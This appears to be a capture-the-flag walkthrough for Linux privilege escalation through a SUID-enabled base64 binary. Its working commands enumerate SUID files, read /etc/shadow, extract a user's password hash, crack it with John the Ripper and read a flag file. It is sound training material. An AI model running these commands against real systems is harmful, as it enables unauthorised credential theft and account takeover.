# SUID Privilege Escalation – Base64

## Step 1: User & Permission Enumeration

First, identify the current user and check available sudo permissions. Also, check whether the `user2` password hash is directly readable.

```bash
whoami
id
sudo -l
grep '^user2:' /etc/shadow
```

## Step 2: System Enumeration

Since sudo access is unavailable and `/etc/shadow` cannot be read directly, search for interesting files, SUID binaries, and capabilities.

```bash
ls -la /home/ubuntu
find / -type f -name "*user2*" 2>/dev/null
find / -perm -4000 -type f -not -path "/snap/*" 2>/dev/null
getcap -r / 2>/dev/null
```

## Step 3: Exploit SUID Base64

**Finding:** `/usr/bin/base64` has SUID permission and can be used to read sensitive files with elevated privileges.

Read the `user2` password hash:

```bash
/usr/bin/base64 /etc/shadow | base64 -d | grep '^user2:'
```

Extract the hash:

```bash
/usr/bin/base64 /etc/shadow | base64 -d | grep '^user2:' | cut -d: -f2 > /tmp/user2_hash.txt
```

Crack the hash using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/user2_hash.txt
```

## Step 4: Read the Flag

Use the SUID Base64 binary to read the flag without normal file-read permissions.

```bash
/usr/bin/base64 /home/ubuntu/flag3.txt | base64 -d
```

## Technique

- **Category:** Linux Privilege Escalation
- **Method:** SUID Misconfiguration
- **Vulnerable Binary:** `/usr/bin/base64`
- **Target:** Sensitive file access (`/etc/shadow`)
- **Tool:** John the Ripper
